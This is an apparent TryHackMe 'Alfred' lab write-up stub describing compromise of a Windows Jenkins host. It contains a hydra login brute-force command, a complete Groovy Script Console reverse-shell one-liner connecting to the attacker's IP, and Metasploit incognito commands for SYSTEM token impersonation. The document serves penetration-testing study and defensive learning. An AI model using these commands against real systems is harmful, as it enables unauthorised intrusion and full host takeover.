# Alfred — TryHackMe

> **Preparation stub.** Based on publicly documented information about this retired room — not an
> original solve, and no live flag values are recorded. Complete the bracketed fields when working
> the room under your own account. Only document legally authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Alfred |
| Difficulty | Easy |
| Category | Windows |
| Target IP | 10.x.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A Windows host running **Jenkins** with weak/default credentials. The Jenkins **Script Console**
(Groovy) is abused for remote code execution and a reverse shell, then **token impersonation**
(abusing `SeImpersonatePrivilege`) escalates to SYSTEM. Teaches CI/CD exposure and Windows
privilege-token abuse.

## Scenario value (study scaffold)

- **What it tests:** recognising an exposed CI/CD system (Jenkins) as RCE-as-a-feature, and Windows
  privilege escalation via `SeImpersonatePrivilege`.
- **What completing it demonstrates:** web-foothold-to-SYSTEM on Windows — Groovy Script Console RCE
  to a reverse shell, then token impersonation (Incognito / Potato family), and the `whoami /priv`
  discipline (MITRE T1078 → T1059 → T1134.001).

## Key vulnerability class

- **Foothold:** **Jenkins** exposed with weak/default credentials → authenticated **Groovy Script
  Console RCE** (CWE-1188 insecure default / CWE-78 command execution via an admin feature). This is
  a *configuration/exposure* issue, not a single CVE.
- **Privesc:** **token impersonation** via **`SeImpersonatePrivilege`** held by the service account —
  the classic "Potato" family (e.g. Incognito token-stealing / JuicyPotato-style) to obtain a SYSTEM
  token (CWE-269 improper privilege management).

## 1. Reconnaissance

```
nmap -sC -sV -p- -oA nmap/alfred 10.x.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Note |
|------|---------|------|
| 80/tcp | http | Decoy/landing web page |
| 3389/tcp | ms-wbt-server | RDP (often present) |
| 8080/tcp | http (Jetty) | **Jenkins — the foothold** |

[Paste trimmed scan output on completion.]

## 2. Enumeration

```
whatweb http://10.x.x.x:8080/
# Browse to :8080 — confirm the Jenkins dashboard / login page
```

- Identify Jenkins on **8080**. Try weak/default credentials first (commonly `admin:admin`); if
  those fail, brute-force the login form:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.x.x.x http-form-post \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid"
```

- [Record the working credential pair (do not publish if reused elsewhere).]

## 3. Exploitation (Groovy Script Console RCE)

Navigate to **Manage Jenkins → Script Console** and run a Groovy reverse-shell one-liner. Set up a
listener first (`nc -lvnp 4444`), then:

```groovy
String host="<tun0 ip>";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
};
p.destroy();s.close();
```

- Alternatively host a `msfvenom` Windows payload and pull/execute it from the console.
- **User flag:** `[capture on completion]`

## 4. Privilege escalation (token impersonation)

```
whoami /priv          # look for SeImpersonatePrivilege = Enabled
```

With `SeImpersonatePrivilege` enabled, impersonate SYSTEM. Metasploit Incognito path:

```
# upgrade the shell to meterpreter, then:
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
getuid                # expect NT AUTHORITY\SYSTEM
```

- Non-Metasploit alternative: a Potato-family tool (JuicyPotato / PrintSpoofer depending on Windows
  version) achieves the same SYSTEM escalation.
- **Root/admin flag:** `[capture on completion]` (on this room the root flag sits in the
  Administrator profile and may need `type` over an absolute path).

## 5. Tools used

| Phase | Tools |
|-------|-------|
| Recon | `nmap` (`-sC -sV -p-`) |
| Access | browser, `whatweb`, `hydra` (Jenkins login brute-force) |
| Exploitation | Jenkins Groovy Script Console; `nc`/`msfvenom` reverse shell |
| Privesc | `whoami /priv`; meterpreter `incognito` (`impersonate_token`) / Potato-family tool |

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Valid Accounts: Default Accounts | T1078.001 |
| Credential Access | Brute Force: Password Guessing | T1110.001 |
| Execution | Command and Scripting Interpreter | T1059 |
| Privilege Escalation | Access Token Manipulation: Token Impersonation | T1134.001 |

## 7. Key learnings

- **CI/CD systems are high-value footholds** — an exposed Jenkins with a Script Console is RCE-as-a-
  feature; never expose Jenkins without auth and never leave default creds.
- **`SeImpersonatePrivilege` is a SYSTEM ticket** — service accounts holding it are routinely
  escalated via the Potato/Incognito techniques; always run `whoami /priv` early on Windows.
- **`whoami /priv` first** — privilege enumeration is faster than blind kernel-exploit hunting.
- **Pick the right Potato for the OS build** — JuicyPotato works on older builds; PrintSpoofer/
  RoguePotato cover patched ones. Know which applies before burning time.
- **Blue-team transfer:** MITRE **T1078** (default accounts), **T1059** (scripting), **T1134**
  (token manipulation); detect anomalous Jenkins console use and token-impersonation events.

## 8. References

- Jenkins Script Console RCE technique (configuration exposure, not a single CVE).
- Potato / Incognito `SeImpersonatePrivilege` abuse references; PrintSpoofer.
